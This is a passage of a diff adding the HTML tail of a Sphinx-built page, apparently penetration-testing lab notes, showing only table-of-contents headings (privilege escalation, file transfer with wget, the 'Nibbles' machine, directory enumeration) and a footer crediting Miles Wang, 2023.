+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#priv-esc-to-root">1.7.1.2.8.2. priv esc to root</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#transferring-files">1.7.1.3. Transferring files</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#wget">1.7.1.3.1. wget</a></li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#nibbles">1.7.1.4. Nibbles</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#web-footprinting">1.7.1.4.1. web footprinting</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#dir-enum">1.7.1.4.1.1. Dir Enum</a></li>
+</ul>
+</li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#initial-foothold">1.7.1.4.2. Initial Foothold</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#enum-using-script">1.7.1.4.2.1. enum using script</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#knowledge-check">1.7.1.5. Knowledge check</a></li>
+</ul>
+</li>
+</ul>
+  </nav></div>
+
+</div></div>
+              
+            
+          </div>
+          <footer class="bd-footer-content">
+            
+<div class="bd-footer-content__inner container">
+  
+  <div class="footer-item">
+    
+<p class="component-author">
+By Miles Wang
+</p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+
+  <p class="copyright">
+    
+      © Copyright 2023.
+      <br/>
+    
+  </p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+</div>
+          </footer>
+        
+
+      </main>
+    </div>
+  </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script src="../../_static/scripts/bootstrap.js?digest=8d27b9dea8ad943066ae"></script>
+<script src="../../_static/scripts/pydata-sphinx-theme.js?digest=8d27b9dea8ad943066ae"></script>
+
+  <footer class="bd-footer">
+  </footer>
+  </body>
+</html>
